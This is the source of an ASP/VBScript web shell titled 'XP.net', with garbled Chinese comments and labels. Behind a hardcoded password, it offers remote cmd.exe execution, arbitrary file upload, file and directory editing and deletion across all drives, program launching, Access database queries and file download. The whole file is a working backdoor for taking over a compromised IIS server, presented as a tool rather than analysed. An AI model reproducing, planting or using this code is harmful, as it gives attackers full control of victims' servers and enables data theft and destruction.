<%@ LANGUAGE="VBSCRIPT"  codepage ="950" %>
<title>::::XP.net��::::</title>
<style>
body{font-family: �ө���;   font-size: 10pt}
table{ font-family: �ө���; font-size: 9pt }
a{ font-family: �ө���; font-size: 9pt; color: #000000; text-decoration: none }
a:hover{ font-family: �ө���; color: #ff0000; text-decoration: none }
input {	BORDER-RIGHT: #888888 1px solid; BORDER-TOP: #888888 1px solid; BACKGROUND: #ffffff; BORDER-LEFT: #888888 1px solid; BORDER-BOTTOM: #888888 1px solid; FONT-FAMILY: "Verdana", "Arial"font-color: #ffffff;FONT-SIZE: 9pt;
</style>
<% '***************���t���t�@�M�N�X����M�R���{�Ƕ}�l***************  %>
<% 
select case request("action")
	case "����"
		result=ExecuteFile(request("run"))
        case "del"
                result=DeleteFile(request("filename"))
        end select

function DeleteFile(fileDel)
    on error resume next 
    dim fs
    Set fs = CreateObject("Scripting.FileSystemObject")
response.write "���R�� (" & fileDel & ")="&cstr(fs.FileExists(fileDel))&"<BR>"    
    if fs.FileExists(fileDel) then        
       fs.DeleteFile fileDel,true
    end if
    if err>0 then 
       err.clear
       DeleteFile=false
    else 
       DeleteFile=true
    end if    
end function

function ExecuteFile(fileExe)
	Set WShShell = Server.CreateObject("WScript.Shell")
	RetCode = WShShell.Run(fileExe, 1, True)
	if RetCode = 0 Then
	    'There were no errors
		ExecuteFile=True
	else
    	ExecuteFile=False
	end if
response.write "Run&nbsp"&"&nbsp"&fileexe&"&nbsp"&executefile
end function
 %>
<% '***************���t���t�@�M�N�X����***************  %>

<% '***************�W�Ǥ��}�l***************  %>
<% if request("up")=1 then %>
<%Server.ScriptTimeOut=5000%>
<SCRIPT RUNAT=SERVER LANGUAGE=VBSCRIPT>
dim Data_5xsoft
Class upload_5xsoft
dim objForm,objFile,Version
Public function Form(strForm)
strForm=lcase(strForm)
if not objForm.exists(strForm) then
Form=""
else
Form=objForm(strForm)
end if
end function
Public function File(strFile)
strFile=lcase(strFile)
if not objFile.exists(strFile) then
set File=new FileInfo
else
set File=objFile(strFile)
end if
end function
Private Sub Class_Initialize
dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
dim iFindStart,iFindEnd
dim iFormStart,iFormEnd,sFormName
set objForm=Server.CreateObject("Scripting.Dictionary")
set objFile=Server.CreateObject("Scripting.Dictionary")
if Request.TotalBytes<1 then Exit Sub
set tStream = Server.CreateObject("adodb.stream")
set Data_5xsoft = Server.CreateObject("adodb.stream")
Data_5xsoft.Type = 1
Data_5xsoft.Mode =3
Data_5xsoft.Open
Data_5xsoft.Write  Request.BinaryRead(Request.TotalBytes)
Data_5xsoft.Position=0
RequestData =Data_5xsoft.Read
iFormStart = 1
iFormEnd = LenB(RequestData)
vbCrlf = chrB(13) & chrB(10)
sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
iStart = LenB (sStart)
iFormStart=iFormStart+iStart+1
while (iFormStart + 10) < iFormEnd
iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
tStream.Type = 1
tStream.Mode =3
tStream.Open
Data_5xsoft.Position = iFormStart
Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart
tStream.Position = 0
tStream.Type = 2
tStream.Charset ="gb2312"
sInfo = tStream.ReadText
tStream.Close
iFormStart = InStrB(iInfoEnd,RequestData,sStart)
iFindStart = InStr(22,sInfo,"name=""",1)+6
iFindEnd = InStr(iFindStart,sInfo,"""",1)
sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
if InStr (45,sInfo,"filename=""",1) > 0 then
set theFile=new FileInfo
iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
iFindEnd = InStr(iFindStart,sInfo,"""",1)
sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileName=getFileName(sFileName)
theFile.FilePath=getFilePath(sFileName)
iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
iFindEnd = InStr(iFindStart,sInfo,vbCr)
theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileStart =iInfoEnd
theFile.FileSize = iFormStart -iInfoEnd -3
theFile.FormName=sFormName
if not objFile.Exists(sFormName) then
objFile.add sFormName,theFile
end if
else
tStream.Type =1
tStream.Mode =3
tStream.Open
Data_5xsoft.Position = iInfoEnd
Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3
tStream.Position = 0
tStream.Type = 2
tStream.Charset ="gb2312"
sFormValue = tStream.ReadText
tStream.Close
if objForm.Exists(sFormName) then
objForm(sFormName)=objForm(sFormName)&", "&sFormValue
else
objForm.Add sFormName,sFormValue
end if
end if
iFormStart=iFormStart+iStart+1
wend
RequestData=""
set tStream =nothing
End Sub
Private Sub Class_Terminate
if Request.TotalBytes>0 then
objForm.RemoveAll
objFile.RemoveAll
set objForm=nothing
set objFile=nothing
Data_5xsoft.Close
set Data_5xsoft =nothing
end if
End Sub
Private function GetFilePath(FullPath)
If FullPath <> "" Then
GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
Else
GetFilePath = ""
End If
End  function
Private function GetFileName(FullPath)
If FullPath <> "" Then
GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
Else
GetFileName = ""
End If
End  function
End Class
Class FileInfo
dim FormName,FileName,FilePath,FileSize,FileType,FileStart
Private Sub Class_Initialize
FileName = ""
FilePath = ""
FileSize = 0
FileStart= 0
FormName = ""
FileType = ""
End Sub
Public function SaveAs(FullPath)
dim dr,ErrorChar,i
SaveAs=true
if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function
set dr=CreateObject("Adodb.Stream")
dr.Mode=3
dr.Type=1
dr.Open
Data_5xsoft.position=FileStart
Data_5xsoft.copyto dr,FileSize
dr.SaveToFile FullPath,2
dr.Close
set dr=nothing
SaveAs=false
end function
End Class
</SCRIPT>
<%
dim upload,file,formName,formPath,iCount
set upload=new upload_5xsoft
if upload.form("filepath")="" then
response.write "�п�J�n�W�Ǧܪ��ؿ�!"
set upload=nothing
response.end
else
formPath=upload.form("filepath")
if right(formPath,1)<>"/" then formPath=formPath&"/"
end if
iCount=0
for each formName in upload.objForm
next
response.write "<br>"
for each formName in upload.objFile
set file=upload.file(formName)
if file.FileSize>0 then
'file.SaveAs Server.mappath(formPath&file.FileName)
file.SaveAs formPath&file.FileName
response.write "<center>"&file.FilePath&file.FileName&" ("&file.FileSize&") => "&formPath&File.FileName&" �W�Ǧ��\!</center><br>"
iCount=iCount+1
end if
set file=nothing
next
set upload=nothing
response.write "<center>"&iCount&"�Ӥ��W�ǵ���!</center>"
response.write "<center><br><a href=""javascript:history.back();""><font color='#D00000'>��^�W�@��</font></a></center>"

 '***************�W�Ǥ�󵲧� ***************

else
url= Request.ServerVariables("URL")
'�ק�U�����K�X
if trim(request.form("password"))="889031" then
response.cookies("password")="allen" '�K�X�O�_���T
response.redirect ""&url&""
else if Request.Cookies("password")<>"allen" then
call login() '�K�X���~
response.end '����B��
end if
select case request("id")
case "edit"
call edit()
case "upload"
call upload()
case "dir"
call dir()
case "down"
'response.write request("path")
call downloadFile(request("path"))

case else
call main()
end select
end if
sub login()
for i=0 to 25
on error resume next
IsObj=false
VerObj=""
dim TestObj
set TestObj=server.CreateObject(ObjTotest(i,0))
If -2147221005 <> Err then
IsObj = True
VerObj = TestObj.version
if VerObj="" or isnull(VerObj) then VerObj=TestObj.about
end if
ObjTotest(i,2)=IsObj
ObjTotest(i,3)=VerObj
next
%>
<body><center>
<table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8">
<tr><td>
<table border=0 width=100% cellspacing=1 cellpadding=0>
<tr bgcolor="#EEEEEE" height=18>
<td width="59%" align=left>&nbsp;�A�Ⱦ��W</td>
<td width="41%" bgcolor="#EEEEEE">&nbsp;<%=Request.ServerVariables("SERVER_NAME")%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>&nbsp;�A�Ⱦ�IP</td>
<td>&nbsp;<%=Request.ServerVariables("LOCAL_ADDR")%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>&nbsp;�A�Ⱦ��ݤf</td>
<td>&nbsp;<%=Request.ServerVariables("SERVER_PORT")%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>&nbsp;�A�Ⱦ��ɶ�</td>
<td>&nbsp;<%=now%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>&nbsp;����󵴹���|</td>
<td>&nbsp;<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>&nbsp;�A�Ⱦ�CPU�ƶq</td>
<td>&nbsp;<%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%> ��</td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>&nbsp;�A�Ⱦ��ާ@�t��</td>
<td>&nbsp;<%=Request.ServerVariables("OS")%></td>
</tr>
<tr bgcolor="#EEEEEE" height=18>
<td align=left><font class=fonts>�A�Ⱦ��B��t�״���</font></td>
<td>&nbsp;�����ɶ�</td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>LCX���q���]64M,�ɦ�433�^</td>
<td>&nbsp;980.5 �@��</td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>�����W�D�����D���]2002-08-06�^</td>
<td>&nbsp;610.9 �@��</td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>�賡�ƽXwest263�D���]2002-08-06�^</td>
<td>&nbsp;357.8 �@��</td>
</tr>
<tr bgcolor="#FFFFFF" height=18><%
dim t1,t2,lsabc,thetime
t1=timer
for i=1 to 500000
lsabc= 1 + 1
next
t2=timer
thetime=cstr(int(( (t2-t1)*10000 )+0.5)/10)
%><td align=left><font color=red>�z���b�ϥΪ��o�x�A�Ⱦ�</font>&nbsp;</td>
<td>&nbsp;<font color=red><%=thetime%> �@��</font></td>
</tr>
</table>
</td>
</tr>
</table>
<html>
<body><center>
<table>
<%response.write "<font class=fonts>�@���u�����@�Ӿާ@:)�b�����ާ@���ݭnFSO���&��A�Ⱦ��ɶ�</font>" %>
<%response.write now()%><BR>
<form action="<%= Request.ServerVariables("URL") %>" method="POST">
<input type=text name=text value="<%=szCMD %>">  <font class=fonts>��J�n�s�����ؿ�,�̫�n�[\</font><br>
<input type=text name=text1 value="<%=szCMD1 %>">
copy
<input type=text name=text2 value="<%=szCMD2 %>"> <font class=fonts>�ت��a�}���n�a���W</font><br>
<input type=text name=text3 value="<%=szCMD3 %>">
move
<input type=text name=text4 value="<%=szCMD4 %>"><font class=fonts> �ت��a�}���n�a���W</font><br>
���|�G<input type=text name=text5 value="<%=szCMD5 %>">
�{�ǡG<input type=text name=text6 value="<%=szCMD6 %>"><font class=fonts> ���i�H�[�Ѽ�</font><br>
<input type=submit name=sb value=�o�e�R�O class=input>
</form>
</table>
</center>
<% 
Dim strSQL, objDBConn, objRS, intFieldCount, intCounter,mdb
mdb = Request.QueryString("mdb")
strSQL = Request.QueryString("SQL")
If strSQL <> "" and left(trim(strsql),6)="select" Then
   Response.Write "SQL�r�Ŧ�: " & strSQL & "<br>" 
   ' �إ߼ƾڮw�s������H
   Set objDBConn = Server.CreateObject("ADODB.Connection")
   ' ���}�ƾڮw�s�� mdb�Чאּ�A�n�s�����ƾڮw�W�r
   objDBConn.Open "DRIVER={Microsoft Access Driver (*.mdb)}; DBQ=" & Server.MapPath(mdb)
   ' ����SQL���ƾڮw�d��
   Set objRS = objDBconn.Execute(strSQL)
   ' ���o�쪺�Ӽ�
   intFieldCount = objRS.Fields.Count - 1
   ' �ˬd�O�_���O�� 
   If Not objRS.Eof Then
      Response.Write "<table border=1><tr>"   
      ' ��ܼƾڮw����W
      For intCounter = 0 to intFieldCount
          Response.Write "<td><b>" & objRS(intCounter).Name & "</b></td>"
      Next
      Response.Write "</tr>"
      ' ��ܼƾڮw���e
      Do While Not objRS.Eof
         Response.Write "<tr>"     
         ' ��ܨC�ӰO������ 
         For intCounter = 0 to intFieldCount
             If objRS.Fields(intCounter).Value <> "" Then
                Response.Write "<td valign=""top"">" & objRS.Fields(intCounter).Value & "</td>"
             Else
                Response.Write "<td valign=""top"">---</td>"
             End If
         Next
         Response.Write "</tr>"
         objRS.MoveNext  ' ����U�@���O��
      Loop
      Response.Write "</table>"
   Else
      Response.Write "<b>�S���ŦX���󪺰O��</b><br>" 
   End If

   objRS.Close         ' �����O�����X
   Set objRS = Nothing
   objDBConn.Close     ' �����ƾڮw�s��
   Set objDBConn = Nothing 
end if
if strSQL <> "" and left(trim(strsql),6)<>"select" Then
%>
<script>javascript:alert("�o���Oselect�R�O\n�Х��}�ƾڮw�ݹB�浲�G\n�������ݺ�lcx\n�o�ӧA�i�H���@��access��sql���:-)")</script>
<%
end if
%>
<form  action="<%=url%>"  method="GET">
<table border=1>
   <tr>
      <td>SQL�r�Ŧ�:</td>
      <td><Input TYPE="TEXT" NAME="SQL" value="<%=strSQL%>" size ="30">
  <Input TYPE="TEXT" NAME="mdb" value="acess�ƾڮw�۹�ؿ��ΦW��" size ="30"></td>
   </tr>
   <tr>
      <td colspan=2 align=center><input TYPE="SUBMIT" value="�d�߼ƾڮw�A�ΰ���䥦sql�y�y"></td>
   </tr>
</table>
<hr>
</form>
</center>

</body>
</html>
<%
szCMD = Request.Form("text")   '�ؿ��s��
if (szCMD <> "")  then
set shell=server.createobject("shell.application") '�إ�shell�ﹳ
set fod1=shell.namespace(szcmd)
set foditems=fod1.items
for each co in foditems
response.write "<font color=black>" & co.path & "-----" & co.size & "</font><br>"
next
end if
%>

<%
szCMD1 = Request.Form("text1")  '�ؿ������A����i�������
szCMD2 = Request.Form("text2")
if szcmd1<>"" and szcmd2<>"" then
set shell1=server.createobject("shell.application") '�إ�shell�ﹳ
set fod1=shell1.namespace(szcmd2)
for i=len(szcmd1) to 1 step -1
if mid(szcmd1,i,1)="\" then
   path=left(szcmd1,i-1)
   exit for
end if
next
if len(path)=2 then path=path & "\"
path2=right(szcmd1,len(szcmd1)-i)
set fod2=shell1.namespace(path)
set foditem=fod2.parsename(path2)
fod1.copyhere foditem
response.write "command completed success!"
end if
%>

<%
szCMD3 = Request.Form("text3")   '�ؿ�����
szCMD4 = Request.Form("text4")
if szcmd3<>"" and szcmd4<>"" then
set shell2=server.createobject("shell.application") '�إ�shell�ﹳ
set fod1=shell2.namespace(szcmd4)

for i=len(szcmd3) to 1 step -1
if mid(szcmd3,i,1)="\" then
   path=left(szcmd3,i-1)
   exit for
end if
next

if len(path)=2 then path=path & "\"
path2=right(szcmd3,len(szcmd3)-i)
set fod2=shell2.namespace(path)
set foditem=fod2.parsename(path2)
fod1.movehere foditem
response.write "command completed success!"
end if
%>
<%
szCMD5 = Request.Form("text5")    '����{�ǭn���w���|
szCMD6 = Request.Form("text6")
if szcmd5<>"" and szcmd6<>"" then
set shell3=server.createobject("shell.application") '�إ�shell�ﹳ
shell3.namespace(szcmd5).items.item(szcmd6).invokeverb
response.write "command completed success!"
end if
%>
<center>

<form method="POST" action=""&url&"">
Enter Password�G<input type="password" name="password" size="20">
<input type="submit" value="LOGIN">
</center></form>
</body>
<%end sub%>
<%sub main()
'�ק�U����urlpath�אּ�A�A�Ⱦ������URL
urlpath="http://localhost"
dim cpath,lpath
set fsoBrowse=CreateObject("Scripting.FileSystemObject")
if Request("path")="" then
lpath="/"
else
lpath=Request("path")&"/"
end if
if Request("attrib")="true" then
cpath=lpath
attrib="true"
else
cpath=Server.MapPath(lpath)
attrib=""
end if
%><html>
<script language="JavaScript">
function crfile(ls)
{if (ls==""){alert("�п�J���W!");}
else {window.open("<%=url%>?id=edit&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
return false;
}
function crdir(ls)
{if (ls==""){alert("�п�J���W!");}
else {window.open("<%=url%>?id=dir&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
return false;
}
</script>
<script language="vbscript">
sub rmdir(ls)
if confirm("�A�u���n�R���o�ӥؿ���!"&Chr(13)&Chr(10)&"�ؿ����G"&ls)   then
window.open("<%=url%>?id=dir&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
end if
end sub
sub copyfile(sfile)
dfile=InputBox(""&Chr(13)&Chr(10)&"�����G"&sfile&Chr(13)&Chr(10)&"�п�J�ؼФ�󪺤��W:"&Chr(13)&Chr(10)&"�\�a���|,�n�ھڧA����e���|�Ҧ�. �`�N:������|�ܨ�c:/��c:\���i�H")
dfile=trim(dfile)
attrib="<%=request("attrib")%>"
if dfile<>"" then
if InStr(dfile,":") or InStr(dfile,"/")=1 then
lp=""
if InStr(dfile,":") and attrib<>"true" then
alert "�藍�_�A�A�b�۹���|�Ҧ��U����ϥε�����|"&Chr(13)&Chr(10)&"���~���|�G["&dfile&"]"
exit sub
end if
else
lp="<%=lpath%>"
end if
window.open(""&url&"?id=edit&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
else
alert"�z�S����J���W�I"
end If
end sub
</script><body bgcolor="#F5F5F5">
<TABLE cellSpacing=1 cellPadding=3 width="750" align=center
bgColor=#b8b8b8 border=0>
<TBODY>
<TR >
<TD
height=22 colspan="4" bgcolor="#eeeeee" >�����L�šG
<%
For Each thing in fsoBrowse.Drives
Response.write "<a href='"&url&"?path="&thing.DriveLetter&":&attrib=true'>"&thing.DriveLetter&"�L:</a>          "
NEXT
%>   &nbsp;����������a�}�G
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
%><%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>  </TD>
</TR>  <TD colspan="4" bgcolor="#ffffff" ><%
if Request("attrib")="true"  then
response.write "<a href='"&url&"'><font color='#D00000'>�I��������۹���|�s��Ҧ�</font></a>"
else
response.write "<a href='"&url&"?attrib=true'><font color='#D00000'>�I�������쵴����|�s��Ҧ�</font></a>"
end if
%>&nbsp���|: <%=cpath%>  &nbsp;&nbsp;��e�s���ؿ�:<%=lpath%></TD></TR> <TR>
<TD height=22 colspan="4" bgcolor="#eeeeee" >
<form name="form1" method="post" action="<%=url%>" >
�s���ؿ�: <input type="text" name="path" size="30" value="c:">
<input type="hidden" name="attrib" value="true">
<input type="submit" name="Submit" value="�s���ؿ�" > �i�Шϥε�����|,���������a�}�I�p"\\pc01\c"�j
</TD></form>
</TR><TR >
<TD colspan="4" bgcolor="#ffffff" ><form name="form1" method="post" action="<%=url%>?up=1" enctype="multipart/form-data" >
<input type="hidden" name="act" value="upload">
�ǦܪA�Ⱦ��w���ؿ�:
<input name="filepath" type="text" value="drv:\path" size="9">
���a�}:
<input type="file" name="file1" value="" size=4><input type="file" name="file2" value="" size=4>
<input type="file" name="file3" value="" size=4>
<input type="submit" name="Submit" value="�W��" > �i�Хε�����|�j
</TD>
</form></TR>
<TR bgcolor="#eeeeee">
<TD colspan="4" >
<%
On Error Resume Next
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form(".CMD")
If (szCMD <> "") Then
szTempFile = "C:\" & oFileSys.GetTempName( )
Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
End If%>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST" name=userdata>
<input type=text name=".CMD" size=10 value="<%= szCMD %>">
<input type=submit value="�B��cmd�R�O">
<input type=text name='name' size=15 value="drive:\file.exe"><input type='button' name=send value="����{��">
<input type=text name='name1' size=15 value="drive:\file.name"><input type='button' name=send1 value="�R�����">�i�Шϥε�����|�[���W�j
<% If (IsObject(oFile)) Then
On Error Resume Next
Response.Write Server.HTMLEncode(oFile.ReadAll)
oFile.Close
Call oFileSys.DeleteFile(szTempFile, True)
End If %>
</TD> </FORM>
<script language=vbscript>
sub send_onclick
window.open("<%=url%>?run="+userdata.name.value+"&action=����")
end sub
</script>
<script language=vbscript>
sub send1_onclick
window.open("<%=url%>?filename="+userdata.name1.value+"&action=del")
end sub
</script>
</TR>
<TR bgColor=#ffffff>
<TD height=22 colspan="4" ><form name="newfile"
onSubmit="return crfile(newfile.filename.value);">
<input type="text" name="filename" size="40">
<input type="submit" value="�s�ؤ��" >
<input type="button" value="�s�إؿ�"onclick="crdir(newfile.filename.value)">�i�s�ؤ��M�s�إؿ�����P�W�j
</TD></form>
</TR>
<TR>
<TD height=22 width="26%" rowspan="2" valign="top" bgColor=#eeeeee >
<%
dim theFolder,theSubFolders
if fsoBrowse.FolderExists(cpath)then
Set theFolder=fsoBrowse.GetFolder(cpath)
Set theSubFolders=theFolder.SubFolders
Response.write"<a href='"&url&"?path="&Request("oldpath")&"&attrib="&attrib&"'><font color='#FF8000'>��</font>��<font color='ff2222'>�^�W�ťؿ�</font></a><br>"
For Each x In theSubFolders
Response.write"<a href='"&url&"?path="&lpath&x.Name&"&oldpath="&Request("path")&"&attrib="&attrib&"'>�|<font color='#FF8000'>��</font>  "&x.Name&"</a> <a href="&chr(34)&"javascript: rmdir('"&lpath&x.Name&"')"&chr(34)&"><font color='#FF8000' >��</font>�R��</a><br>"
Next
end if
%>
</TD>
<TD  width="45%"  bgColor=#eeeeee>���W �]���в�����W�i�H�d�ݵ�����ݩʡ^</TD>
<TD width="11%" bgColor=#eeeeee>�j�p�]�r�`�^</TD>
<TD width="18%" bgColor=#eeeeee>���ާ@</TD>
</TR>
<TR>
<TD height=200 colspan="3" valign="top" bgColor=#ffffff>
<%
dim theFiles
if fsoBrowse.FolderExists(cpath)then
Set theFolder=fsoBrowse.GetFolder(cpath)
Set theFiles=theFolder.Files
Response.write"<table  width='100%' border='0' cellspacing='0' cellpadding='2'>"
For Each x In theFiles
if Request("attrib")="true" then
showstring="<strong>"&x.Name&"</strong>"
else
showstring="<a href='"&urlpath&lpath&x.Name&"' title='"&"����"&x.type&chr(10)&"�ݩ�"&x.Attributes&chr(10)&"�ɶ��G"&x.DateLastModified&"'target='_blank'><strong>"&x.Name&"</strong></a>"
end if
Response.write"<tr><td width='50%'  style='border-bottom:1 solid #000000;'><font color='#FF8000'>��</font>"&showstring&"</td><td width='8%'  style='border-bottom:1 solid #000000;'>"&x.size&"</a></td><td width='20%'  style='border-bottom:1 solid #000000;'>&nbsp;<a href='"&url&"?id=edit&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank' >�s��</a>&nbsp;<a href='#' onclick=copyfile('"&lpath&x.Name&"')>�ƻs</a>&nbsp;<a href='"&url&"?id=edit&path="&lpath&x.Name&"&op=del&attrib="&attrib&"' target='_blank' >�R��</a>&nbsp;<a href='"&url&"?id=down&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank'>�U��</a>&nbsp;</td></tr>"
Next
end if
Response.write"</table>"
%>
</TD>
</TR></TBODY>
</TABLE>
<% end sub
sub edit()
if request("op")="del"  then
'**********�R�����********
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.GetFile(whichfile)
thisfile.Delete True
Response.write "<br><center>�R�����\�I�n��s�~��ݨ�ĪG.</center>"
'**********�R����󵲧�********
else
if request("op")="copy" then
'**********�ƻs���********
if Request("attrib")="true" then
whichfile=Request("path")
dsfile=Request("dpath")
else
whichfile=server.mappath(Request("path"))
dsfile=Server.MapPath(Request("dpath"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.GetFile(whichfile)
thisfile.copy dsfile
Response.write "<center><p>�����G"+whichfile+"</center>"
Response.write "<center><br>�ت����G"+dsfile+"</center>"
Response.write "<center><br>�ƻs���\�I�n��s�~��ݨ�ĪG!</p></center>"
'**********�ƻs��󵲧�********
else
if request.form("text")="" then
if Request("creat")<>"yes" then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.OpenTextFile(whichfile, 1, False)
counter=0
thisline=thisfile.readall
thisfile.Close
set fs=nothing
end if
%>
<form method="POST" action=""&url&"?id=edit">
<input type="hidden" name="attrib" value="<%=Request("attrib")%>">
<br>
<TABLE cellSpacing=1 cellPadding=3 width="750" align=center
bgColor=#b8b8b8 border=0>
<TBODY>
<TR >
<TD
height=22 bgcolor="#eeeeee" ><div align="center">xp.net�����s�边</div></TD>
</TR>
<TR >
<TD width="100%"
height=22 bgcolor="#ffffff" >���W�G
<input type="text" name="path" size="45"
value="<%=Request("path")%>"readonly>
</TD>
</TR>
<TR>
<TD
height=22 bgcolor="#eeeeee" > <div align="center">
<textarea rows="25" name="text" cols="105"><%=thisline%></textarea>
</div></TD>
</TR>
<TR>
<TD
height=22 bgcolor="#ffffff" ><div align="center">
<input type="submit"
value="����" name="B1">
<input type="reset" value="�_��" name="B2">
</div></TD>
</TR>
</TABLE>
</form>
<%else
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set outfile=fs.CreateTextFile(whichfile)
outfile.WriteLine Request("text")
outfile.close
set fs=nothing
Response.write "<center>�ק令�\�I�n��s�~��ݨ�ĪG!</center>"
end if
end if
end if
end sub
end if
%>
<% sub dir()
if request("op")="del"  then
'***********�R���ؿ�**********
if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
fs.DeleteFolder whichdir,True
Response.write "<center>�R�����\�I�n��s�~��ݨ�ĪG�A�R�����ؿ���:<b>"&whichdir&"</b></center>"
'**********�R���ؿ�����*************
else
'***********�s�إؿ�**********
if request("op")="creat"  then
if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
fs.CreateFolder whichdir
Response.write "<center>�إߦ��\�I�n��s�~��ݨ�ĪG,�إߪ��ؿ���:<b>"&whichdir&"</b></center>"
'***********�s�إؿ�����**********
end if
end if
end sub
'****�U�����
function downloadFile(strFile)
 strFilename = server.MapPath(strFile)
Response.Buffer = True
Response.Clear
Set s = Server.CreateObject("ADODB.Stream")
s.Open
s.Type = 1
on error resume next
Set fso = Server.CreateObject("Scripting.FileSystemObject")
 if not fso.FileExists(strFilename) then
  Response.Write("<h1>Error:</h1>" & strFilename & " does not exist<p>")
  Response.End
 end if
 Set f = fso.GetFile(strFilename)
 intFilelength = f.size
s.LoadFromFile(strFilename)
 if err then
  Response.Write("<h1>Error: </h1>" & err.Description & "<p>")
  Response.End
 end if
 Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
 Response.AddHeader "Content-Length", intFilelength
 Response.CharSet = "UTF-8"
 Response.ContentType = "application/octet-stream"
  Response.BinaryWrite s.Read
 Response.Flush
 s.Close
 Set s = Nothing
 response.end
End Function 
%>
<br>

</body>
</html>

